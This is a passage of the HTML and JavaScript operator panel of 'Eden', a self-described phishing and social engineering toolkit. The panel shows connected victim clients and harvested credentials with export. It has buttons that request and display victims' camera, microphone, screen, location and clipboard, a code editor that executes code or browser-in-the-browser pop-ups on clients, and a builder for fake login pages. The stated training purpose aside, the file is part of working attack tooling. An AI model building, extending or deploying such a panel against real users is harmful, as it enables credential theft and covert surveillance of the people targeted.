            canvas.height = clientScreen.naturalHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(clientScreen, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = generateEdenFilename(clientId, 'screenshare', 'png');
            link.click();
            
            // Show success message
            showStatusMessage('success', `Screen screenshot saved for client ${clientId}`);
        } catch (e) {
            console.error(`Error taking screen screenshot for client ${clientId}:`, e);
            showStatusMessage('warning', `Failed to take screen screenshot: ${e.message}`);
        }
    }
</script>
    

</head>
<body>
    <div class="layout">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-logo-container">
                     <!-- <img src="Eden_logo.png" alt="Eden Garden Logo" class="logo-image"> -->
                    <div class="sidebar-logo">EDEN</div>
                    <div class="sidebar-subtitle">Exploit & Dynamic Execution Network</div>
                </div>
            </div>
            <ul class="sidebar-menu">
                <li class="sidebar-menu-item">
                    <a href="#" class="active" data-section="connection">
                        <i class="fas fa-network-wired"></i>
                        <span>Connection</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="display">
                        <i class="fas fa-desktop"></i>
                        <span>Display</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" data-section="editor">
                        <i class="fas fa-code"></i>
                        <span>Code Editor</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="blur">
                        <i class="fas fa-eye-slash"></i>
                        <span>Blur Tool</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" data-section="download">
                        <i class="fas fa-download"></i>
                        <span>Download</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" data-section="custom">
                        <i class="fas fa-paint-brush"></i>
                        <span>Custom</span>
                    </a>
                </li>

                <li class="sidebar-menu-item">
                    <a href="#" data-section="permission">
                     <i class="fas fa-shield-alt"></i>
                        <span>Permission</span>
                    </a>
                </li>

                <li class="sidebar-menu-item">
                    <a href="#" data-section="credentials">
                        <i class="fas fa-key"></i>
                        <span>Credentials</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="preview">
                        <i class="fas fa-eye"></i>
                        <span>Preview</span>
                    </a>
                </li>
                
                <li class="sidebar-menu-item">
                    <a href="#" data-section="aboutus">
                        <i class="fas fa-info-circle"></i>
                        <span>About Us</span>
                    </a>
                </li>
                
            </ul>
        </aside>
        
        <!-- Main Content -->
        <main class="main-content">
            <!-- Navigation Toggle Button (Always Visible) -->
            <button class="toggle-sidebar" id="mobileNavToggle">
                <i class="fas fa-bars"></i>
            </button>
            
            <!-- Header -->
            <div class="header">
                <div class="header-left">
                    <h1 style="color: #023e8a;">Eden</h1>
                    <p class="header-subtitle" style="color: #4895ef;">Redefining browser intelligence through dynamic execution.</p>
                </div>
                <div class="header-right">
                    <div class="toggle-container">
                        <label class="toggle-switch">
                            <input type="checkbox" id="reloadToggle">
                            <span class="slider"></span>
                        </label>
                    </div>
                    

                   
                    <!-- Reload toggle -->
                <div class="toggle-container">
                    <span class="toggle-label">Reload:</span>
                    <label class="toggle-switch">
                        <input type="checkbox" id="displayReloadToggle" checked>
                        <span class="toggle-slider"></span>
                    </label>
                    
                </div>
                
                <!-- Logout Button -->
                <button id="logoutBtn" class="btn-logout" onclick="logout()" style="background-color: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: background-color 0.3s; margin-left: 15px;">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </button>
                </div>
            </div>
            
    <!-- About Us Section -->
<div class="content-section" id="aboutus">
    <div class="container">
        <!-- Page Title -->
        <div class="page-title">
            <h1>About Eden</h1>
            <p>Phishing & Social Engineering Toolkit</p>
        </div>

        <!-- About Section -->
        <div class="about-section">
            <div class="about-header">
                <h2>Eden</h2>
            </div>
            <p>Eden is a phishing and social media hacking tool inspired by various existing red team concepts.
                It was built to simulate real-world attack scenarios for ethical hacking practice, security research, and awareness testing. Eden is designed for learning and experimentation in controlled environments.</p>
            
            <p>While still under development, the project aims to grow with future updates that will include advanced features, stealth improvements, and broader compatibility.</p>
        </div>

        <!-- Team Section -->
        <div class="about-section">
            <div class="about-header">
                <h2>About us</h2>
            </div>
            
            <div class="team-container">
                <!-- Creator -->
                <div class="team-member no-image">
                    <div class="member-name">Varun</div>
                    <div class="member-role">Ethical Hacker</div>
                    <div class="member-bio">
                        <p>I'm a passionate cybersecurity enthusiast with a strong interest in ethical hacking, red teaming, and web application security. I spend my time learning, building tools, and simulating real-world attacks in safe environments to sharpen my skills. I'm currently exploring opportunities to grow and contribute within the cybersecurity field.</p>
                    </div>
                    <div class="social-links">
                        <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                            <i class="fab fa-github"></i>
                        </a>
                        <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                            <i class="fab fa-linkedin-in"></i>
                        </a>
                        <a href="#" class="social-link" title="Twitter">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a href="#" class="social-link" title="Instagram">
                            <i class="fab fa-instagram"></i>
                        </a>
                        <a href="#" class="social-link" title="Discord">
                            <i class="fab fa-discord"></i>
                        </a>
                    </div>
                </div>
                
                <!-- Mentor -->
                <div class="team-member no-image">
                    <div class="member-name">Aashish Kumar</div>
                    <div class="member-role">Cybersecurity Mentor</div>
                    <div class="member-bio">
                        <p>Cybersecurity teacher, creator, and Co-Founder of M Cyber Academy. Provided expert guidance throughout the development of Eden, sharing invaluable insights from years of industry experience.</p>
                    </div>
                    <div class="social-links">
                        <a href="https://www.linkedin.com/in/aashish-kumar-hak0r" target="_blank" class="social-link" title="LinkedIn">
                            <i class="fab fa-linkedin-in"></i>
                        </a>
                        <a href="https://www.instagram.com/mcyberacademy/" target="_blank" class="social-link" title="Instagram">
                            <i class="fab fa-instagram"></i>
                        </a>
                        <a href="#" class="social-link" title="Twitter">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a href="#" class="social-link" title="Discord">
                            <i class="fab fa-discord"></i>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
            
            <!-- Connection Section -->
            <div class="content-section active" id="connection">
                <div class="connection-header">
                    <h2 class="connection-title">Connected Clients</h2>
                    <div>

                        <button class="btn-clear-all" id="clearAllBtn">
                            <i class="fas fa-trash-alt"></i>
                            Clear All
                        </button>
                    </div>
                </div>
                
                <div class="client-selection-bar" id="selectionBar" style="display: none; margin-bottom: 20px; padding: 12px; background: rgba(255, 255, 255, 0.9); border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 51, 128, 0.1);">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span><b><span id="selectedCount">0</span> client(s) selected</b></span>
                        <button class="btn-outline" id="cancelSelectionBtn" style="padding: 5px 12px; font-size: 0.8rem;">
                            <i class="fas fa-times"></i> Cancel Selection
                        </button>
                    </div>
                </div>
                
                <div class="client-list" id="clientList">
                    <!-- Client cards will be added here dynamically -->
                    <div class="empty-state" id="emptyState">
                        <div class="empty-icon">
                            <i class="fas fa-plug"></i>
                        </div>
                        <div class="empty-text">No active connections</div>
                        <div class="empty-subtext">Waiting for clients to connect...</div>
                    </div>
                </div>
                
                <!-- Communication Interface (Hidden by default) -->
                <div id="communicationInterface" style="display: none; margin-top: 20px; background: rgba(255, 255, 255, 0.9); border-radius: 12px; padding: 20px; box-shadow: 0 5px 15px rgba(0, 51, 128, 0.1);">
                    <h3 style="margin-top: 0; margin-bottom: 15px; color: var(--dark);">Communication</h3>
                    <div style="margin-bottom: 15px;">
                        <p><strong>Selected IP:</strong> <span id="selectedIpDisplay">None</span></p>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <textarea id="messageInput" placeholder="Enter your message here..." style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); height: 100px; font-family: inherit;"></textarea>
                    </div>
                    <div style="display: flex; justify-content: flex-end; gap: 10px;">
                        <button id="closeCommBtn" class="btn-outline" style="padding: 8px 15px;">Close</button>
                        <button id="sendMessageBtn" class="btn-primary" style="padding: 8px 15px;">
                            <i class="fas fa-paper-plane"></i> Send Message
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Permission Section -->
<div class="content-section" id="permission">
    <h2>Permission Control Panel</h2>
    <div class="perm-container">
        <div class="perm-button-container">
            <button class="perm-button" onclick="requestAllPermissions()">🔐 Request All Permissions</button>
            <button class="perm-button" onclick="requestPermission('camera')">📸 Request Camera Access</button>
            <button class="perm-button" onclick="requestPermission('microphone')">🎤 Request Microphone Access</button>
            <button class="perm-button" onclick="requestPermission('screen')">🖥️ Request Screen Capture</button>
            <button class="perm-button" onclick="requestPermission('location')">📍 Request Location Access</button>
            <button class="perm-button" onclick="requestPermission('clipbord')">📋 Request Clipboard Access</button>
        </div>
        <div id="status-container">
            <div class="perm-nav-tabs">
                <button class="perm-nav-tab active" onclick="showsContent('all')">All</button>
                <button class="perm-nav-tab" onclick="showsContent('camera')">Camera</button>
                <button class="perm-nav-tab" onclick="showsContent('screen')">Screen</button>
                <button class="perm-nav-tab" onclick="showsContent('clipboard')">Clipboard</button>
                <button class="perm-nav-tab" onclick="showsContent('audio')">Audio</button>
                <button class="perm-nav-tab" onclick="showsContent('location')">Location</button>
                <button class="perm-nav-tab" onclick="showsContent('other')">Other</button>
            </div>
            
            <div id="all-content" class="perm-content-section active">
                <h3>All Status Logs</h3>
                <div id="allLogs"></div>
            </div>

            <div id="camera-content" class="perm-content-section">
                <h3>Camera Feed</h3>
                
                <!-- Client-specific camera feeds section -->
                <div class="section-container">
                    <h4>Client-Specific Camera Feeds</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Camera feeds from specific clients will appear below.
                    </div>
                    <div id="client-camera-feeds" style="margin-top: 20px; display: flex; flex-direction: column; gap: 20px;"></div>
                </div>
                
                <div id="cameraLogs"></div>
            </div>

            <div id="audio-content" class="perm-content-section">
                <h3>Audio Visualization</h3>
                
                <!-- Client-specific audio section -->
                <div class="section-container">
                    <h4>Client-Specific Audio Feeds</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Audio feeds from specific clients will appear below.
                    </div>
                    <div id="audioContainer" style="margin-top: 20px;">
                        <!-- Client-specific audio visualizers will be added here dynamically -->
                    </div>
                </div>
                
                <div id="audioLogs"></div>
            </div>

            <div id="location-content" class="perm-content-section">
                <h3>Location Information</h3>
                
                <!-- Location drawer similar to clipboard section -->
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <p>Location history by client</p>
                    <button id="clearLocationBtn" class="perm-button" onclick="clearAllLocationHistory()">
                        <i class="fas fa-trash"></i> Clear All History
                    </button>
                </div>
                
                
                
                <div id="locationHistory" class="location-history-container" style="margin-top: 20px;"></div>
                
                <div id="locationLogs"></div>
            </div>

            <div id="screen-content" class="perm-content-section">
                <h3>Screen Capture</h3>
                
                <!-- Client-specific screen captures section -->
                <div class="section-container">
                    <h4>Client-Specific Screen Captures</h4>
                    <div class="client-section-info" style="margin-bottom: 15px; padding: 10px; background: #e8f4fd; border-left: 4px solid #2196f3; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> 
                        Screen captures from specific clients will appear below.
                    </div>
                    <div id="client-screen-captures" style="margin-top: 20px; display: flex; flex-direction: column; gap: 20px;"></div>
                </div>
                
                <div id="screenLogs"></div>
            </div>

            <div id="clipboard-content" class="perm-content-section">
                <h3>Clipboard Content</h3>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <p>Clipboard history by client</p>
                    <div style="display: flex; gap: 10px; align-items: center;">
                        <div class="export-options" style="display: flex; align-items: center; background-color: #f8f9fa; padding: 5px 10px; border-radius: 4px; border: 1px solid #dee2e6;">
                            <label for="clipboardExportFormatSelect" style="margin-right: 8px; font-size: 14px; color: #495057;">Format:</label>
                            <select id="clipboardExportFormatSelect" style="padding: 5px; border-radius: 4px; border: 1px solid #ced4da; background-color: white;">
                                <option value="html">HTML</option>
                                <option value="pdf">PDF</option>
                                <option value="txt">Text</option>
                                <option value="json">JSON</option>
                            </select>
                        </div>
                        <button id="exportClipboardBtn" class="btn-export" style="background-color: #28a745; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; transition: all 0.3s ease;">
                            <i class="fas fa-file-export" style="margin-right: 5px;"></i>
                            Export
                        </button>
                        <button id="clearClipboardBtn" class="perm-button" onclick="clearClipboardHistory()">Clear All History</button>
                    </div>
                </div>
                <div id="clipboardHistory" class="clipboard-history-container"></div>
                <div id="clipboardLogs"></div>
            </div>

            <div id="other-content" class="perm-content-section">
                <h3>Other Permissions</h3>
                <div id="otherLogs"></div>
            </div>
        </div>
    </div>
</div>

            <!-- Credentials Section -->
            <div class="content-section" id="credentials">
                <h2>Captured Credentials</h2>
                <div class="credentials-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                    <p class="header-subtitle">Form submissions with credential fields</p>
                    <div class="credentials-actions" style="display: flex; gap: 10px; align-items: center;">
                        
                        
                        <div class="export-options" style="display: flex; align-items: center; background-color: #f8f9fa; padding: 5px 10px; border-radius: 4px; border: 1px solid #dee2e6;">
                            <label for="exportFormatSelect" style="margin-right: 8px; font-size: 14px; color: #495057;">Format:</label>
                            <select id="exportFormatSelect" style="padding: 5px; border-radius: 4px; border: 1px solid #ced4da; background-color: white;">
                                
                                <option value="html">HTML</option>
                                <option value="pdf">PDF</option>                            
                                <option value="txt">Text</option>
                                <option value="json">JSON</option>
                            </select>
                        </div>
                      
                        <button id="exportCredentialsBtn" class="btn-export" style="background-color: #28a745; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; transition: all 0.3s ease;">
                            <i class="fas fa-file-export" style="margin-right: 5px;"></i>
                            Export
                        </button>
                        <button id="clearCredentialsBtn" class="btn-clear-all" style="background-color: #dc3545; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; display: flex; align-items: center;">
                            <i class="fas fa-trash-alt" style="margin-right: 5px;"></i>
                            Clear All
                        </button>
                    </div>
                </div>
                
                <!-- Add this style section for credential selection -->

                
                <div id="credentialsEmptyState" style="text-align: center; padding: 2rem; background: rgba(255, 255, 255, 0.7); border-radius: 8px;">
                    <div style="font-size: 2.5rem; margin-bottom: 15px; color: #64748b;">
                        <i class="fas fa-key"></i>
                    </div>
                    <div style="font-size: 1.2rem; font-weight: 600; color: #334155; margin-bottom: 5px;">No credentials captured</div>
                    <div style="color: #64748b; font-size: 0.9rem;">Waiting for form submissions with username, password, email, etc.</div>
                </div>
                
                <div id="credentialsList" style="display: grid; grid-template-columns: 1fr; gap: 15px;"></div>
            </div>
            
            <!-- Preview-Section (BOM.html) -->
            <div class="content-section" id="preview">
                <h2>Live Content Preview</h2>
                <div class="preview-description" style="margin-bottom: 15px; background: #f8f9fa; padding: 10px; border-radius: 5px; border-left: 3px solid #4CAF50;">
                    <p><i class="fas fa-info-circle"></i> This panel shows the live content from tracked client pages in real-time</p>
                </div>
                
                <!-- Mouse position tracking detail -->
                <div class="mouse-position-container" style="display: flex; margin-bottom: 15px; background: #e3f2fd; padding: 15px; border-radius: 5px; border-left: 3px solid #2196F3;">
                    <div style="flex: 1;">
                        <h3 style="margin: 0 0 10px 0; color: #0d47a1; font-size: 16px;">
                            <i class="fas fa-mouse-pointer"></i> Mouse Position Tracking
                        </h3>
                        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">X Position</div>
                                <div id="mouseXDetail" style="font-size: 20px; font-weight: bold; color: #2196F3;">0</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Y Position</div>
                                <div id="mouseYDetail" style="font-size: 20px; font-weight: bold; color: #2196F3;">0</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Client ID</div>
                                <div id="mouseClientId" style="font-size: 16px; font-weight: bold; color: #2196F3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">-</div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">% X,Y</div>
                                <div style="font-size: 16px; font-weight: bold; color: #2196F3;">
                                    <span id="mouseXPercent">0</span>%, <span id="mouseYPercent">0</span>%
                                </div>
                            </div>
                            <div class="position-box" style="background: white; padding: 10px; border-radius: 4px; text-align: center; width: 120px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                                <div style="font-size: 12px; color: #666;">Last Update</div>
                                <div id="mouseLastUpdate" style="font-size: 14px; font-weight: bold; color: #2196F3;">-</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Add styles for tracking buttons and minimization -->

                
                <!-- Client Container Grid - Replaces single iframe container -->
                <div id="client-preview-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(1024px, 2fr)); gap: 50px; padding: 20px; box-sizing: border-box; width: 100%; max-width: 100vw; min-height: 100vh; height: auto; overflow: visible;">
                    <!-- Client containers will be added here dynamically -->
                </div>
                

                
            </div>
            
            <!-- Display Section -->
            <div class="content-section" id="display" style="background: transparent;">
                <div class="upload-section" style="background-color: transparent;">
                    <h2>Upload File</h2>
                    <div class="editor-buttons action-buttons" style="margin-bottom: 1rem; margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                        <button onclick="clearUploadedData()" class="btn primary">Clear Server</button>
                        <button onclick="clearClientData()" class="btn warning">Clean Display</button>
                        <button onclick="uploadToClientStorage()" class="btn success">Upload All</button>
                        <button onclick="clearClientStorage()" class="btn danger">Clear All</button>
                    </div>
                    
                    
                    <div class="drop-zone" id="dropZone">
                        <div class="drop-zone-text">
                            <p>Drag & Drop files here</p>
                            <p>or</p>
                            <label for="fileInput" class="file-input-label">Choose File</label>
                            <input type="file" id="fileInput" class="file-input" accept=".html,.js,.mhtml,.css" hidden multiple>
                        </div>
                    </div>
                    <div class="file-info" id="fileInfo">
                        <p>No file selected</p>
                    </div>

                    <div class="stored-files" id="storedFiles">
                        <h3>Stored Files</h3>
                        <ul id="fileList"></ul>
                    </div>
                </div>
            </div>
            
            <!-- Code Editor Section -->
            <div class="content-section" id="editor">
                <h2>Code Editor</h2>
                <div class="client-selection-info" style="margin-bottom: 10px; font-size: 14px;">
                    <span id="selection-info" style="display:none; color:#2196F3; font-weight:bold;"></span>
                </div>
                
                <!-- Code editor -->
                <textarea id="codeInput" placeholder="Enter your HTML, CSS, and JavaScript code here..."></textarea>
                
                <!-- Action buttons -->
                <div class="editor-buttons action-buttons" style="margin-top: 15px; margin-bottom: 1rem; margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                    <button id="viewBtn" class="btn primary">Display</button>
                    <button id="BITBBtn" class="btn primary">BITB</button>
                    <button id="executeBtn" class="btn primary">Execute</button>
                    <button id="cleanBtn" class="btn warning">Clean</button>
                </div>
                

                <!-- Credentials Section -->
                <div id="credentialsSection" style="display: none; margin-top: 20px;">
                    <h3>Received Credentials</h3>
                    <div id="credentialsInfo"></div>
                </div>
            </div>
            
            <!-- Blur Section -->
            <div class="content-section" id="blur">
                <h2>Image Blur Tool</h2>
                <div class="blur-section">
                    <div class="upload-area" id="blurUploadArea">
                        <div class="upload-icon">
                            <i class="fas fa-cloud-upload-alt"></i>
                        </div>
                        <h3>Upload Files</h3>
                        <p>Drag & drop your HTML files here or click to select</p>
                        <input type="file" id="blurFileInput" accept=".html,.htm" multiple hidden>
                    </div>
                    
                    <div class="effect-settings">
                        <h3>Blur Settings</h3>
                        <div class="blur-controls-row" style="margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                            <div class="effect-selector-container">
                                <select class="effect-selector" id="blurEffectType">
                                    <option value="blur">Gaussian Blur</option>
                                    <option value="shade">Shade Effect</option>
                                    <option value="none">No Effect</option>
                                </select>
                            </div>
                            
                            <button id="uploadEffectBtn" class="btn primary btn-small">
                                Upload Effect
                            </button>
                            
                            <button id="removeCustomEffectsBtn" class="btn warning btn-small">
                                Remove Effects
                            </button>
                            
                            <div class="blur-buttons-container">
                                <button id="setLocationBtn" class="btn primary btn-small">
                                    Set Location
                                </button>
                                <button id="resetLocationBtn" class="btn btn-neutral btn-small">
                                    Reset Location
                                </button>
                                <button id="clearBlurBtn" class="btn warning btn-small">
                                    Clear
                                </button>
                            </div>
                        </div>
                        
                        <div class="range-control">
                            <label>Effect Intensity</label>
                            <input type="range" min="1" max="20" value="10" id="blurIntensity">
                            <div class="range-value"><span id="blurIntensityValue">10</span></div>
                        </div>
                    </div>
                    
                    <div class="file-list">
                        <h3>Uploaded Files</h3>
                        <div id="blurFilesContainer" class="files-container"></div>
                    </div>
                    
                    <div class="status-container"></div>
                </div>
            </div>
            


            <!-- Custom Section -->
            <div class="content-section" id="custom">
                <h2>Custom Template</h2>
                <div class="custom-section">
                    <div class="custom-content-container">
                        <!-- Left Side - Form -->
                        <div class="custom-form-container">
                            <h3>Template Details</h3>
                            <div class="form-group">
                                <label>Template Name</label>
                                <input type="text" id="templateName" class="form-control" placeholder="Enter template name">
                            </div>
                            <div class="form-group">
                                <label>Logo Text</label>
                                <input type="text" id="logoText" class="form-control" placeholder="Enter logo text">
                            </div>
                            <div class="form-group">
                                <label>Logo Image URL</label>
                                <input type="url" id="logoUrl" class="form-control" placeholder="Enter logo image URL">
                            </div>
                            <div class="form-group">
                                <label>Container Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="containerColor" value="#ffffff">
                                    <input type="text" id="colorCode" class="form-control" placeholder="Enter hex code" value="#ffffff">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Login Button Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="loginButtonColor" value="#0066ff">
                                    <input type="text" id="buttonColorCode" class="form-control" placeholder="Enter hex code" value="#0066ff">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Text Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="textColor" value="#333333">
                                    <input type="text" id="textColorCode" class="form-control" placeholder="Enter hex code" value="#333333">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Button Text</label>
                                <input type="text" id="buttonText" class="form-control" placeholder="Sign In" value="Sign In">
                            </div>
                            <div class="form-group">
                                <label>Form Style</label>
                                <select id="formStyle" class="form-control">
                                    <option value="standard">Standard</option>
                                    <option value="rounded">Rounded Corners</option>
                                    <option value="flat">Flat Design</option>
                                    <option value="shadow">Shadow Effect</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Template Size</label>
                                <div class="size-inputs">
                                    <div class="input-group">
                                        <label>Width</label>
                                        <input type="number" id="templateWidth" class="form-control" placeholder="Width" value="400" min="200" max="1200">
                                        <span class="unit">px</span>
                                    </div>
                                    <div class="input-group">
                                        <label>Height</label>
                                        <input type="number" id="templateHeight" class="form-control" placeholder="Height" value="400" min="200" max="1200">
                                        <span class="unit">px</span>
                                        <div class="auto-height">
                                            <input type="checkbox" id="autoHeight" checked>
                                            <label for="autoHeight">Auto height</label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="makeRequiredFields">
                                    <label for="makeRequiredFields">Make all form inputs required</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="addRememberMe">
                                    <label for="addRememberMe">Add "Remember Me" checkbox</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="addForgotPassword">
                                    <label for="addForgotPassword">Add "Forgot Password" link</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Form Fields</label>
                                <div id="formFieldsContainer">
                                    <div class="field-row">
                                        <div class="field-select">
                                            <select class="form-control">
                                                <option value="username">Username</option>
                                                <option value="email">Email</option>
                                                <option value="password">Password</option>
                                            </select>
                                        </div>
                                        <button class="btn btn-small" id="addFieldBtn">
                                            <i class="fas fa-plus"></i> Add Field
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Right Side - Preview -->
                        <div class="custom-preview-container">
                            <h3>Live Preview</h3>
                            <div id="templatePreview" class="preview-container">
                                <!-- Preview will be generated here -->
                                <div class="template-preview-placeholder">
                                    Preview will appear here as you fill in the details
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Bottom Action Buttons -->
                    <div class="custom-actions">
                        <button id="sendTemplateBtn" class="btn primary">
                            <i class="fas fa-paper-plane"></i> Save to Blur Section
                        </button>
                        <button id="sendToDownloadBtn" class="btn success">
                            <i class="fas fa-download"></i> Send to Download
                        </button>
                        <button id="resetTemplateBtn" class="btn secondary">
                            <i class="fas fa-undo"></i> Reset
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Download Section -->
            <div class="content-section" id="download">
                <h2>Download Control Panel</h2>
                <div class="blur-section">
                    <div class="upload-area" id="download-upload-area">
                        <div class="upload-icon">
                            <i class="fas fa-cloud-upload-alt"></i>
                        </div>
                        <h3>Upload Files</h3>
                        <p>Drag & drop your files here or click to select</p>
                        <input type="file" id="download-file-input" multiple hidden>
                    </div>
                    
                    <div class="effect-settings">
                        <h3>Download Settings</h3>
                        <div class="blur-controls-row" style="margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                            <div class="effect-selector-container">
                                <select class="effect-selector" id="download-effect-selector">
                                    <option value="blur">Gaussian Blur</option>
                                    <option value="shade">Shade Effect</option>
                                    <option value="none">No Effect</option>
                                </select>
                            </div>
                            
                            <button id="downloadUploadEffectBtn" class="btn primary btn-small">
                                Upload Effect
                            </button>
                            
                            <button id="downloadRemoveCustomEffectsBtn" class="btn warning btn-small">
                                Remove Effects
                            </button>
                            
                            <div class="blur-buttons-container">
                                <button id="location-button" class="btn primary btn-small">
                                    Set Location
                                </button>
                                <button id="reset-location-button" class="btn btn-neutral btn-small">
                                    Reset Location
                                </button>
                                <button id="download-clear-server" class="btn warning btn-small" onclick="clearDownloadStorage(); return false;">
                                    Clear
                                </button>
                            </div>
                        </div>
                        
                        <div class="range-control">
                            <label>Effect Intensity</label>
                            <input type="range" min="1" max="20" value="10" id="downloadIntensity">
                            <div class="range-value"><span id="downloadIntensityValue">10</span></div>
                        </div>
                        
                        <div class="action-buttons" style="margin-top: 10px; margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                            <button id="sudo-download-button" class="btn success">
                                Sudo Download
                            </button>
                        </div>
                    </div>
                    
                    <div class="file-list">
                        <h3>Uploaded Files</h3>
                        <div id="download-files-container" class="files-container"></div>
                    </div>
                    
                    <div class="status-container"></div>
                    
                    <div id="location-picker-modal" style="position:fixed;z-index:100;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;">
                        <div class="modal-content">
                            <div style="display:flex;justify-content:space-between;margin-bottom:10px;">
                                <h3>Set Display Location</h3>
                                <span id="location-picker-close" style="cursor:pointer;font-size:20px;">&times;</span>
                            </div>
                            <div id="location-preview" style="position:relative;width:100%;height:300px;border:1px solid #ccc;background:#fff;cursor:crosshair;">
                                <div id="location-marker" style="position:absolute;width:8px;height:8px;background:red;border-radius:50%;transform:translate(-50%,-50%);display:none;"></div>
                            </div>
                            <div style="text-align:right;margin-top:10px;">
                                <button id="location-save-button" class="btn primary">Save Location</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Footer -->
            <div class="footer">
                <div>© 2025 EDEN Admin Connection. All rights reserved.</div>
                <div>Version 1.0.0</div>
            </div>
        </main>
    </div>
    
    <script>
        // Clear Download Storage function
        function clearDownloadStorage() {
            try {
                // Clear all download-related items from localStorage
                localStorage.removeItem('downloadFiles');
                localStorage.removeItem('eden-download-files');
                localStorage.removeItem('eden-download-selected-files');
                
                // Remove any individual download file entries
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key && key.startsWith('eden-download-selected-')) {
                        localStorage.removeItem(key);
                    }
                }
                
                // Clear the UI display
                const filesContainer = document.getElementById('download-files-container');
                if (filesContainer) {
                    filesContainer.innerHTML = '<p class="no-files">No files uploaded</p>';
                }
                
                // Show success message
                alert('Download storage cleared successfully');
            } catch (e) {
                console.error('Error clearing download storage:', e);
            }
        }
        
        // Clipboard History Management
        const clipboardHistory = {
            // Initialize from localStorage or create empty object
            data: (() => {
                try {
                    const stored = localStorage.getItem('clipboardHistory');
                    return stored ? JSON.parse(stored) : {};
                } catch (e) {
                    console.error('Error loading clipboard history:', e);
                    return {};
                }
            })(),
            
            // Add new clipboard entry
            addEntry: function(clientId, content, displayName) {
                if (!clientId || !content) return;
                
                // Initialize client entries if not exists
                if (!this.data[clientId]) {
                    this.data[clientId] = [];
                }
                
                // Store nickname if provided
                if (displayName) {
                    this.data[clientId].displayName = displayName;
                }
                
                // Check if this content already exists for this client to prevent duplicates
